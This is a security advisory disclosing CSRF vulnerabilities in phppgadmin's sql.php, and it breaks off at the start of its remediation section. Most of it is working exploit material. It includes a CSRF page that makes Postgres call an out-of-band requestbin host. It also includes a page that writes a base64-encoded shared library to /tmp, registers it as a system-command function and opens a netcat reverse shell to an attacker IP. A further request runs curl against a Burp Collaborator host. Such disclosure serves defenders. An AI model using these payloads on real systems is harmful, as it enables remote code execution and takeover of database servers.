    "content": "This advisory discloses a CSRF vulnerability that exists in phppgadmin/phppgadmin. The details that was sent to the maintainer can be seen here: phppgadmin%20CSRF%20Vulnerability.pdfCSRF IntroductionWhen a web server receives a request, the request should be validated before it initiates any action on the server. Checking the session ID or authorisation cookie is not sufficient, because these cookies are sent automatically by a user’s browser even if the user did not knowingly make the request.The SQL dashboard area within phppgadmin allows sensitive actions to be performed without validating that the request originated from the application. This could enable an attacker to trick a user into performing these actions unknowingly through a Cross Site Request Forgery (CSRF) attack.ImpactBy leveraging this vulnerability, an attacker might be able to gain unauthorized access to information, stored in database, execute arbitrary commands on the server, compromise the entire application and perform attacks against application users and company’s infrastructure.Multiple areas within the application is vulnearable to CSRF. One such area is the database.php webpage.The vulnerability exists due to failure in the database.php webpage not verifying the source of HTTP request. A remote attacker can trick a logged-in administrator to visit a malicious page with CSRF exploit and execute arbitrary system commands on the server.The proof of concept below when visited, will send a HTTP POST request to vulnerable application and instructs the backend postgres database to make a HTTP request to an attacker-controlled server by utilising the CREATE command.Proof of Concept to identify if a phppgadmin instance is vulnerable through Out of Band Technique&lt;html&gt;&lt;body&gt;&lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;&lt;script&gt;function submitRequest(){var xhr = new XMLHttpRequest();xhr.open(\"POST\", \"http:\\/\\/phppgadmin.local:49161\\/phppgadmin\\/sql.php\", true);xhr.setRequestHeader(\"Accept\",\"text\\/html,application\\/xhtml+xml,application\\/xml;q=0.9,*\\/*;q=0.8\");xhr.setRequestHeader(\"Accept-Language\", \"en-GB,en;q=0.5\");xhr.setRequestHeader(\"Content-Type\", \"multipart\\/form-data;boundary=---------------------------317222262731323\");xhr.withCredentials = true;var body = \"-----------------------------317222262731323\\r\\n\" +\"Content-Disposition: form-data; name=\\\"query\\\"\\r\\n\" +\"\\r\\n\" +\"CREATE EXTENSION dblink;SELECTdblink_connect(\\'host=mydatahere.b940ab686a17804777c0.d.requestbin.net user=postgrespassword=password dbname=dvdrental\\');\\r\\n\" +\"-----------------------------317222262731323\\r\\n\" +\"Content-Disposition: form-data; name=\\\"MAX_FILE_SIZE\\\"\\r\\n\" +\"\\r\\n\" +\"2097152\\r\\n\" +\"-----------------------------317222262731323\\r\\n\" +\"Content-Disposition: form-data; name=\\\"script\\\"; filename=\\\"\\\"\\r\\n\" +\"Content-Type: application/octet-stream\\r\\n\" +\"\\r\\n\" +\"\\r\\n\" +\"-----------------------------317222262731323\\r\\n\" +\"Content-Disposition: form-data; name=\\\"execute\\\"\\r\\n\" +\"\\r\\n\" +\"Execute\\r\\n\" +\"-----------------------------317222262731323\\r\\n\" +\"Content-Disposition: form-data; name=\\\"server\\\"\\r\\n\" +\"\\r\\n\" +\"localhost:5432:allow\\r\\n\" +\"-----------------------------317222262731323\\r\\n\" +\"Content-Disposition: form-data; name=\\\"database\\\"\\r\\n\" +\"\\r\\n\" +\"postgres\\r\\n\" +\"-----------------------------317222262731323--\\r\\n\";var aBody = new Uint8Array(body.length);for (var i = 0; i &lt; aBody.length; i++)aBody[i] = body.charCodeAt(i);xhr.send(new Blob([aBody]));}&lt;/script&gt;&lt;form action=\"#\"&gt;&lt;input type=\"button\" value=\"Submit request\" onclick=\"submitRequest();\" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;dblink_connect() establishes a connection to a remote PostgreSQL database. This can be used to connect to an attacker controlled server and verify the CSRF attack succeed.Request that gets sent from the above Proof Of Concept when executed by a victimPOST /phppgadmin/sql.php HTTP/1.1Host: phppgadmin.local:49161User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-GB,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------317222262731323Content-Length: 886Origin: nullConnection: closeCookie: PPA_ID=npk16gm33btgv8vca9a65di3s1;webfx-tree-cookie-persistence=wfxt-4+wfxt-6+wfxt-8+wfxt-10+wfxt-12-----------------------------317222262731323Content-Disposition: form-data; name=\"query\"CREATE EXTENSION dblink;SELECTdblink_connect('host=mydatahere.b940ab686a17804777c0.d.requestbin.net user=postgrespassword=password dbname=dvdrental');-----------------------------317222262731323Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"2097152-----------------------------317222262731323Content-Disposition: form-data; name=\"script\"; filename=\"\"Content-Type: application/octet-stream-----------------------------317222262731323Content-Disposition: form-data; name=\"execute\"Execute-----------------------------317222262731323Content-Disposition: form-data; name=\"server\"localhost:5432:allow-----------------------------317222262731323Content-Disposition: form-data; name=\"database\"postgres-----------------------------317222262731323--Steps to Reproduce  Take the HTML proof of concept, make changes to reflect target domain where the phppgadmin instance is hosted  Login to the vulnerable phppgadmin instance as a privileged user such as ‘postgres’  Visit the proof of concept file within the same browser to click submit to execute the CSRF attackRemote Code ExecutionPostgres also allows a user to interact with the underlying operating system giving to the database administrator or to a malicious user, potentially a remote attacker through a SQL injection vulnerability, the possibility to execute operating system commands as well as read and write files on the file system.The following proof of concept can be used to upload a user-defined function (UDF) in PostgresSQL and execute commands on the underlying operating system.Note: the following proof of concept has been tailored to only execute commands on an Ubuntu 18.04 target system.&lt;html&gt;&lt;body&gt;&lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;&lt;script&gt;function submitRequest(){var xhr = new XMLHttpRequest();xhr.open(\"POST\", \"http:\\/\\/192.168.1.78\\/phppgadmin\\/sql.php\", true);xhr.setRequestHeader(\"Accept\",\"text\\/html,application\\/xhtml+xml,application\\/xml;q=0.9,*\\/*;q=0.8\");xhr.setRequestHeader(\"Accept-Language\", \"en-GB,en;q=0.5\");xhr.setRequestHeader(\"Content-Type\", \"multipart\\/form-data;boundary=---------------------------297112967428312\");xhr.withCredentials = true;var body = \"-----------------------------297112967428312\\r\\n\" +\"Content-Disposition: form-data; name=\\\"query\\\"\\r\\n\" +\"\\r\\n\" +\"SELECT lo_create(43213);\\r\\n\" +\"INSERT INTO pg_largeobject (loid, pageno, data) values (43213, 0,decode(\\'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\\',\\'base64\\'));\\r\\n\" +\"INSERT INTO pg_largeobject (loid, pageno, data) values (43213, 1,decode(\\'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAGAAAAAAAAIAYAAAAAAAABAAAAAAAAAIcAAAAAAAAADAAAAAAAAABABQAAAAAAAA0AAAAAAAAAsAYAAAAAAAAZAAAAAAAAABAOIAAAAAAAGwAAAAAAAAAIAAAAAAAAABoAAAAAAAAAGA4gAAAAAAAcAAAAAAAAAAgAAAAAAAAA9f7/bwAAAADwAQAAAAAAAAUAAAAAAAAAiAMAAAAAAAAGAAAAAAAAADgCAAAAAAAACgAAAAAAAAC1AAAAAAAAAAsAAAAAAAAAGAAAAAAAAAADAAAAAAAAAAAQIAAAAAAAAgAAAAAAAAAYAAAAAAAAABQAAAAAAAAABwAAAAAAAAAXAAAAAAAAACgFAAAAAAAABwAAAAAAAACABAAAAAAAAAgAAAAAAAAAqAAAAAAAAAAJAAAAAAAAABgAAAAAAAAA/v//bwAAAABgBAAAAAAAAP///28AAAAAAQAAAAAAAADw//9vAAAAAD4EAAAAAAAA+f//bwAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\\',\\'base64\\'));\\r\\n\" +\"INSERT INTO pg_largeobject (loid, pageno, data) values (43213, 2,decode(\\'IA4gAAAAAAAAAAAAAAAAAAAAAAAAAAAAdgUAAAAAAAAgECAAAAAAAEdDQzogKFVidW50dSA3LjMuMC0xNnVidW50dTMpIDcuMy4wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwABAMgBAAAAAAAAAAAAAAAAAAAAAAAAAwACAPABAAAAAAAAAAAAAAAAAAAAAAAAAwADADgCAAAAAAAAAAAAAAAAAAAAAAAAAwAEAIgDAAAAAAAAAAAAAAAAAAAAAAAAAwAFAD4EAAAAAAAAAAAAAAAAAAAAAAAAAwAGAGAEAAAAAAAAAAAAAAAAAAAAAAAAAwAHAIAEAAAAAAAAAAAAAAAAAAAAAAAAAwAIACgFAAAAAAAAAAAAAAAAAAAAAAAAAwAJAEAFAAAAAAAAAAAAAAAAAAAAAAAAAwAKAGAFAAAAAAAAAAAAAAAAAAAAAAAAAwALAIAFAAAAAAAAAAAAAAAAAAAAAAAAAwAMAJAFAAAAAAAAAAAAAAAAAAAAAAAAAwANALAGAAAAAAAAAAAAAAAAAAAAAAAAAwAOAMAGAAAAAAAAAAAAAAAAAAAAAAAAAwAPAOAGAAAAAAAAAAAAAAAAAAAAAAAAAwAQABgHAAAAAAAAAAAAAAAAAAAAAAAAAwARABAOIAAAAAAAAAAAAAAAAAAAAAAAAwASABgOIAAAAAAAAAAAAAAAAAAAAAAAAwATACAOIAAAAAAAAAAAAAAAAAAAAAAAAwAUAOAPIAAAAAAAAAAAAAAAAAAAAAAAAwAVAAAQIAAAAAAAAAAAAAAAAAAAAAAAAwAWACAQIAAAAAAAAAAAAAAAAAAAAAAAAwAXACgQIAAAAAAAAAAAAAAAAAAAAAAAAwAYAAAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAAAMAAAAAgAMAJAFAAAAAAAAAAAAAAAAAAAOAAAAAgAMANAFAAAAAAAAAAAAAAAAAAAhAAAAAgAMACAGAAAAAAAAAAAAAAAAAAA3AAAAAQAXACgQIAAAAAAAAQAAAAAAAABGAAAAAQASABgOIAAAAAAAAAAAAAAAAABtAAAAAgAMAGAGAAAAAAAAAAAAAAAAAAB5AAAAAQARABAOIAAAAAAAAAAAAAAAAACYAAAABADx/wAAAAAAAAAAAAAAAAAAAACiAAAAAQAOAMAGAAAAAAAAHAAAAAAAAAC1AAAAAQAOANwGAAAAAAAABAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAADDAAAAAQAQANAHAAAAAAAAAAAAAAAAAAAAAAAABADx/wAAAAAAAAAAAAAAAAAAAADRAAAAAQAWACAQIAAAAAAAAAAAAAAAAADeAAAAAQATACAOIAAAAAAAAAAAAAAAAADnAAAAAAAPAOAGAAAAAAAAAAAAAAAAAAD6AAAAAQAWACgQIAAAAAAAAAAAAAAAAAAGAQAAAQAVAAAQIAAAAAAAAAAAAAAAAAAcAQAAEgAMAGoGAAAAAAAADQAAAAAAAAAqAQAAIAAAAAAAAAAAAAAAAAAAAAAAAABGAQAAEAAWACgQIAAAAAAAAAAAAAAAAABNAQAAEgANALAGAAAAAAAAAAAAAAAAAABTAQAAEgAAAAAAAAAAAAAAAAAAAAAAAABnAQAAIAAAAAAAAAAAAAAAAAAAAAAAAACQAQAAEgAMAIQGAAAAAAAAKgAAAAAAAAB2AQAAEAAXADAQIAAAAAAAAAAAAAAAAAB7AQAAEAAXACgQIAAAAAAAAAAAAAAAAACHAQAAEgAMAHcGAAAAAAAADQAAAAAAAACYAQAAIAAAAAAAAAAAAAAAAAAAAAAAAACyAQAAIgAAAAAAAAAAAAAAAAAAAAAAAADOAQAAEgAJAEAFAAAAAAAAAAAAAAAAAAAAY3J0c3R1ZmYuYwBkZXJlZ2lzdGVyX3RtX2Nsb25lcwBfX2RvX2dsb2JhbF9kdG9yc19hdXgAY29tcGxldGVkLjc2OTYAX19kb19nbG9iYWxfZHRvcnNfYXV4X2ZpbmlfYXJyYXlfZW50cnkAZnJhbWVfZHVtbXkAX19mcmFtZV9kdW1teV9pbml0X2FycmF5X2VudHJ5AHBnX2V4ZWMuYwBQZ19tYWdpY19kYXRhLjQ3NzkAbXlfZmluZm8uNDc4OABfX0ZSQU1FX0VORF9fAF9fZHNvX2hhbmRsZQBfRFlOQU1JQwBfX0dOVV9FSF9GUkFNRV9IRFIAX19UTUNfRU5EX18AX0dMT0JBTF9PRkZTRVRfVEFCTEVfAFBnX21hZ2ljX2Z1bmMAX0lUTV9kZXJlZ2lzdGVyVE1DbG9uZVRhYmxlAF9lZGF0YQBfZmluaQBzeXN0ZW1AQEdMSUJDXzIuMi41AF9fZ21vbl9zdGFydF9fAF9lbmQAX19ic3Nfc3RhcnQAcGdfZmluZm9fcGdfZXhlYwBfSVRNX3JlZ2lzdGVyVE1DbG9uZVRhYmxlAF9fY3hhX2ZpbmFsaXplQEBHTElCQ18yLjIuNQBfaW5pdAAALnN5bXRhYgAuc3RydGFiAC5zaHN0cnRhYgAubm90ZS5nbnUuYnVpbGQtaWQALmdudS5oYXNoAC5keW5zeW0ALmR5bnN0cgAuZ251LnZlcnNpb24ALmdudS52ZXJzaW9uX3IALnJlbGEuZHluAC5yZWxhLnBsdAAuaW5pdAAucGx0Lmc=\\',\\'base64\\'));\\r\\n\" +\"INSERT INTO pg_largeobject (loid, pageno, data) values (43213, 3,decode(\\'b3QALnRleHQALmZpbmkALnJvZGF0YQAuZWhfZnJhbWVfaGRyAC5laF9mcmFtZQAuaW5pdF9hcnJheQAuZmluaV9hcnJheQAuZHluYW1pYwAuZ290LnBsdAAuZGF0YQAuYnNzAC5jb21tZW50AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbAAAABwAAAAIAAAAAAAAAyAEAAAAAAADIAQAAAAAAACQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAALgAAAPb//28CAAAAAAAAAPABAAAAAAAA8AEAAAAAAABEAAAAAAAAAAMAAAAAAAAACAAAAAAAAAAAAAAAAAAAADgAAAALAAAAAgAAAAAAAAA4AgAAAAAAADgCAAAAAAAAUAEAAAAAAAAEAAAAAQAAAAgAAAAAAAAAGAAAAAAAAABAAAAAAwAAAAIAAAAAAAAAiAMAAAAAAACIAwAAAAAAALUAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAASAAAAP///28CAAAAAAAAAD4EAAAAAAAAPgQAAAAAAAAcAAAAAAAAAAMAAAAAAAAAAgAAAAAAAAACAAAAAAAAAFUAAAD+//9vAgAAAAAAAABgBAAAAAAAAGAEAAAAAAAAIAAAAAAAAAAEAAAAAQAAAAgAAAAAAAAAAAAAAAAAAABkAAAABAAAAAIAAAAAAAAAgAQAAAAAAACABAAAAAAAAKgAAAAAAAAAAwAAAAAAAAAIAAAAAAAAABgAAAAAAAAAbgAAAAQAAABCAAAAAAAAACgFAAAAAAAAKAUAAAAAAAAYAAAAAAAAAAMAAAAVAAAACAAAAAAAAAAYAAAAAAAAAHgAAAABAAAABgAAAAAAAABABQAAAAAAAEAFAAAAAAAAFwAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABzAAAAAQAAAAYAAAAAAAAAYAUAAAAAAABgBQAAAAAAACAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAfgAAAAEAAAAGAAAAAAAAAIAFAAAAAAAAgAUAAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAIcAAAABAAAABgAAAAAAAACQBQAAAAAAAJAFAAAAAAAAHgEAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAACNAAAAAQAAAAYAAAAAAAAAsAYAAAAAAACwBgAAAAAAAAkAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAkwAAAAEAAAACAAAAAAAAAMAGAAAAAAAAwAYAAAAAAAAgAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAJsAAAABAAAAAgAAAAAAAADgBgAAAAAAAOAGAAAAAAAANAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACpAAAAAQAAAAIAAAAAAAAAGAcAAAAAAAAYBwAAAAAAALwAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAswAAAA4AAAADAAAAAAAAABAOIAAAAAAAEA4AAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAL8AAAAPAAAAAwAAAAAAAAAYDiAAAAAAABgOAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADLAAAABgAAAAMAAAAAAAAAIA4gAAAAAAAgDgAAAAAAAMABAAAAAAAABAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAggAAAAEAAAADAAAAAAAAAOAPIAAAAAAA4A8AAAAAAAAgAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAANQAAAABAAAAAwAAAAAAAAAAECAAAAAAAAAQAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADdAAAAAQAAAAMAAAAAAAAAIBAgAAAAAAAgEAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA4wAAAAgAAAADAAAAAAAAACgQIAAAAAAAKBAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAOgAAAABAAAAMAAAAAAAAAAAAAAAAAAAACgQAAAAAAAAJAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAABQEAAAAAAAAFgFAAAAAAAAGgAAACwAAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAqBUAAAAAAADUAQAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAHwXAAAAAAAA8QAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=\\',\\'base64\\'));\\r\\n\" +\"SELECT lo_export(43213, \\'/tmp/pg_exec.so\\');\\r\\n\" +\"CREATE FUNCTION sys(cstring) RETURNS int AS \\'/tmp/pg_exec.so\\', \\'pg_exec\\'LANGUAGE \\'c\\' STRICT;\\r\\n\" +\"SELECT sys(\\'mknod /tmp/backpipe p\\');\\r\\n\" +\"SELECT sys(\\'/bin/sh 0\\x3c/tmp/backpipe | nc 192.168.1.81 801\\x3e/tmp/backpipe\\');\\r\\n\" +\"-----------------------------297112967428312\\r\\n\" +\"Content-Disposition: form-data; name=\\\"MAX_FILE_SIZE\\\"\\r\\n\" +\"\\r\\n\" +\"2097152\\r\\n\" +\"-----------------------------297112967428312\\r\\n\" +\"Content-Disposition: form-data; name=\\\"script\\\"; filename=\\\"\\\"\\r\\n\" +\"Content-Type: application/octet-stream\\r\\n\" +\"\\r\\n\" +\"\\r\\n\" +\"-----------------------------297112967428312\\r\\n\" +\"Content-Disposition: form-data; name=\\\"execute\\\"\\r\\n\" +\"\\r\\n\" +\"Execute\\r\\n\" +\"-----------------------------297112967428312\\r\\n\" +\"Content-Disposition: form-data; name=\\\"server\\\"\\r\\n\" +\"\\r\\n\" +\"localhost:5432:allow\\r\\n\" +\"-----------------------------297112967428312\\r\\n\" +\"Content-Disposition: form-data; name=\\\"database\\\"\\r\\n\" +\"\\r\\n\" +\"postgres\\r\\n\" +\"-----------------------------297112967428312--\\r\\n\";var aBody = new Uint8Array(body.length);for (var i = 0; i &lt; aBody.length; i++)aBody[i] = body.charCodeAt(i);xhr.send(new Blob([aBody]));}&lt;/script&gt;&lt;form action=\"#\"&gt;&lt;input type=\"button\" value=\"Submit request\" onclick=\"submitRequest();\" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;CSRF 2The following request was also found to be vulnerable to CSRF.POST /phpad/sql.php HTTP/1.1Host: 192.168.1.82User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-GB,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 181Cookie: PPA_ID=hpgneejqaotogcv6ib6lv9ajpb;webfx-tree-cookie-persistence=wfxt-4+wfxt-6+wfxt-8+wfxt-10+wfxt-12Connection: closeserver=localhost%3A5432%3Aallow&amp;database=&amp;search_path=public&amp;query=copy+%28select+%27%27%29+to+program+%27curl+http%3A%2F%2Fjobo9rr2vb8jb48i6jge9vy9c0iq6f.burpcollaborator.net%27RemediationTo ensure that all requests originate from the user knowingly interacting with the application, each request to a 